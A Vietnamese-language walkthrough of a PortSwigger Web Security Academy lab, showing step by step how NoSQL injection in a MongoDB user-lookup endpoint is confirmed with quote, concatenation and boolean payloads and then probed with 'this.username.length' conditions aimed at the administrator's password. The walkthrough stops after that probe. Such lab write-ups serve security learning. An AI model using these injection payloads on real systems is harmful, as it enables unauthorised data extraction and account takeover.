# **Lab: Exploiting NoSQL injection to extract data**

> The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.  
 To solve the lab, extract the password for the `administrator` user, then log in to their account.  
  You can log in to your own account using the following credentials: `wiener:peter`.  

# **Solution**

Thực hiện đăng nhập vào ứng dụng web bằng thông tin được cung cấp.  

Sau khi đăng nhập, quan sát lịch sử HTTP, ta thấy có gói tin sau:

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 81

{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "role": "user"
}
```

Sau khi đăng nhập, ứng dụng sẽ yêu cầu và lấy thông tin về ngừoi dùng hiện tại bao gồm `username`, `email`, `role`.  

Nhận thấy req này có thể khai thác, gửi req này tới repeater và chỉnh sửa giá trị tham số `user`:

```
GET /user/lookup?user=wiener HTTP/2
Host: 0a73006604581c338228795600c10063.web-security-academy.net
Cookie: session=7cvdAe3XYRlX5uk3kOiHSVnw7NzuyZkB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a73006604581c338228795600c10063.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

```

```
user=wiener'
```

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 58

{
  "message": "There was an error getting user details"
}
```

Đã gây ra lỗi phía ứng dụng, chứng tỏ việc chèn `'` đã phá vỡ cấu trúc câu truy vấn.  

Thử thêm một vài ký tự giúp truy vấn hợp lệ:

```
user=wiener'%2b'
```

Phản hồi đã trả về bình thường, giờ thêm điều kiện vào truy vấn:

```
# req
user=wiener'&&'1'=='2
encode: user=wiener'%26%26'1'%3d%3d'2

# res
{
  "message": "Could not find user"
}
```

```
# req
user=wiener'&&'1'=='1
encode: user=wiener'%26%26'1'%3d%3d'1

# res
{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "role": "user"
}
```

Thành công thêm điều kiện để thực thi phía máy chủ. Nghĩa là chúng ta có thể thêm điều kiện trong truy vấn để lấy thông tin cần thiết.

Mục tiêu là lấy thông tin tài khoản `administrator`.  
Giờ cần xác nhận tài khoản `administrator` tồn tại :

```
# req
user=administrator

# res
{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```

Giờ kiểm tra lại các req trước. Ta thấy khi đăng nhập, có req gửi đi 2 tham số là `username` và `password`. Có thể đoán rằng tồn tại field `password` dùng để đăng nhập. Giờ cần kiểm tra tồn tại trường `password`:

Trong tệp js lấy thông tin user, ta thấy có các trường username, email, role. Có thể truy cập vào các trường này bằng `this.[field]`.  

Ta sẽ chọn cách kiểm tra `this.[field_name].length`.

```
# req
user=administrator'&&this.username.length>'0
encode: user=administrator'%26%26this.username.length>'0
# res
{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```

```

```